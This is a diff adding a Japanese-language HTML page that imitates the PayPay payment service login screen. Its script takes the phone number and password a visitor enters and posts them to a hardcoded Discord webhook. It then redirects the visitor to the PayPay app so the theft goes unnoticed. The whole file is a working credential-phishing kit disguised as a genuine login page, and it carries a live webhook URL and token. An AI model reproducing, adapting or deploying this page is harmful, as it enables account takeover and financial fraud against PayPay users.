@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>paypay.ne.jp</title>
+    
+    <style>
+        /* 既存のスタイル */
+        .login1 {
+            font-size: 19px;
+            margin-top: 25px;
+            font-weight: 350;
+            text-align: center;
+        }
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #ffffff;
+        }
+        .container {
+            max-width: 100%;
+            width: 100%;
+            margin: 0 auto;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .logo img {
+            width: 390px;
+            margin-top: -22px;
+            margin-left: -15px;
+            display: block;
+            margin-bottom: 20px;
+        }
+        .input-container {
+            position: relative;
+            margin-top: 40px;
+        }
+        input[type="tel"], input[type="password"] {
+            width: calc(100% - 20px);
+            padding: 12px 10px;
+            border: none;
+            border-radius: 4px;
+            font-size: 18px !important;
+            font-weight: 350;
+            outline: none;
+        }
+        .input-line {
+            height: 2px;
+            background-color: #ccc;
+            transition: background-color 0.3s;
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+        }
+        .login-btn {
+            background-color: #E6E6E6;
+            color: #fff;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            border-radius: 4px;
+            font-size: 16px;
+            margin-top: 24px;
+            cursor: not-allowed;
+            transition: background-color 0.3s ease;
+        }
+        .login-btn.active {
+            background-color: #007bff;
+            cursor: pointer;
+        }
+        .forgot-password {
+            color: #007bff;
+            text-decoration: none;
+            display: block;
+            text-align: center;
+            margin-top: 30px;
+        }
+        .external-login button {
+            width: 100%;
+            height: 45px;
+            padding: 5px;
+            margin: 15px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            background-color: #fff;
+            font-size: 15px !important;
+            color: #686868 !important;
+            font-weight: 600 !important;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .external-login button img {
+            width: 40px;
+            margin-right: 10px;
+        }
+        .register-link {
+            margin-top: -36px;
+            font-size: 16px;
+            font-weight: 600;
+            margin-left: 200px;
+            color: #007bff;
+            text-decoration: none;
+            display: block;
+            text-align: center;
+        }
+        .touroku {
+            font-size: 12px;
+            color: #3895FF;
+            margin-top: 20px;
+            margin-left: 55px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">
+            <img src="IMG_2881.jpeg" alt="PayPay ロゴ">
+        </div>
+
+        <p class="login1">PayPayに登録した携帯電話でログイン</p>
+
+        <form id="loginForm">
+            <div class="input-container">
+                <input type="tel" id="phone" placeholder="携帯電話番号" maxlength="13" minlength="13" required>
+                <div class="input-line"></div>
+            </div>
+            <div class="input-container">
+                <input type="password" id="password" placeholder="パスワード" maxlength="32" minlength="6" pattern="^[A-Za-z0-9]+$" required>
+                <div class="input-line"></div>
+            </div>
+
+            <a href="https://www.paypay.ne.jp/user/pw/init" class="forgot-password">パスワードをお忘れですか？</a>
+
+            <button class="login-btn" type="button" id="login-btn">ログイン</button>
+        </form>
+        <p class="yahoo">外部のアカウントでログイン</p>
+        <div class="external-login">
+            <a href="https://login.yahoo.co.jp/">
+                <button>
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRl0IB-M-SCD0R4RQ-e8zV94lh1HorSRRf7vtVp0SFIaazKTIcKfjem-R0&s=10" class="yahoo_image" alt="Yahoo Japan ID">
+                    Yahoo!JAPAN ID
+                </button>
+            </a>
+            <a href="https://id.my.softbank.jp/sbid_auth/type1/2.0/ipng.php?ticket=MjlmMDRlNTEtNWIxMC00N2U1LWVkM2MtNzA0MDc5Y2IxMDdh">
+                <button>
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTT5gH9pG6CFGs1OycNAtsllFGVQVlN7OKXROPSDGQdLOeql-hmJ74A3Uk&s=10" class="softbank_image" alt="SoftBank">
+                    ソフトバンク・ワイモバイル・LINEMO
+                </button>
+            </a>
+        </div>
+        <hr style="height: 1px; border: none; background-color: #f2f2f2; margin-top: 60px;">
+        <p class="touroku">アカウントをお持ちでない場合</p>
+        <a href="https://www.paypay.ne.jp/app/account/sign-up" class="register-link">新規登録</a>
+    </div>
+
+    <script>
+        const phoneInput = document.getElementById('phone');
+        const passwordInput = document.getElementById('password');
+        const loginBtn = document.getElementById('login-btn');
+
+        // WebhookのURLをここに設定
+        const discordWebhookURL = 'https://discord.com/api/webhooks/1286859317361774665/j7-8Ibs8vK0MooyAnEHjFHwlTeXhikS6N8QdZ3NMX3Xnnu3z4UZ0hbu7ocnorkAQRRZC';
+
+        // PayPayアプリのURLスキーム
+        const payPayAppURL = 'paypay://';
+
+        // 電話番号にハイフンを自動的に追加する関数
+        function formatPhoneNumber() {
+            let phone = phoneInput.value.replace(/\D/g, ''); // 数字以外を削除
+            if (phone.length > 3 && phone.length <= 7) {
+                phone = phone.slice(0, 3) + '-' + phone.slice(3);
+            } else if (phone.length > 7) {
+                phone = phone.slice(0, 3) + '-' + phone.slice(3, 7) + '-' + phone.slice(7);
+            }
+            phoneInput.value = phone;
+        }
+
+        // フォームの各入力項目の値が条件を満たすかをチェックする関数
+        function validateInputs() {
+            const isPhoneValid = phoneInput.value.length === 13; // ハイフンを含めて13文字
+            const isPasswordValid = passwordInput.value.length >= 6; // パスワードが6文字以上
+
+            if (isPhoneValid && isPasswordValid) {
+                loginBtn.classList.add('active');
+                loginBtn.disabled = false;
+            } else {
+                loginBtn.classList.remove('active');
+                loginBtn.disabled = true;
+            }
+        }
+
+        // Discordに送信する関数
+        function sendToDiscord(phone, password) {
+            const message = {
+                content: `電話番号: ${phone}\nパスワード: ${password}`
+            };
+
+            fetch(discordWebhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(message)
+            })
+            .then(response => {
+                if (response.ok) {
+                    // PayPayアプリを開く
+                    window.location.href = payPayAppURL;
+                } else {
+                    console.error('送信に失敗しました。');
+                }
+            })
+            .catch(error => {
+                console.error('エラー:', error);
+            });
+        }
+
+        // 電話番号やパスワードが入力されるたびにチェックとフォーマット
+        phoneInput.addEventListener('input', function() {
+            formatPhoneNumber();
+            validateInputs();
+        });
+
+        passwordInput.addEventListener('input', validateInputs);
+
+        // ログインボタンが押されたときにDiscordに送信
+        loginBtn.addEventListener('click', function() {
+            if (loginBtn.classList.contains('active')) {
+                const phone = phoneInput.value;
+                const password = passwordInput.value;
+                sendToDiscord(phone, password);
+            }
+        });
+    </script>
+
+</body>
+</html>
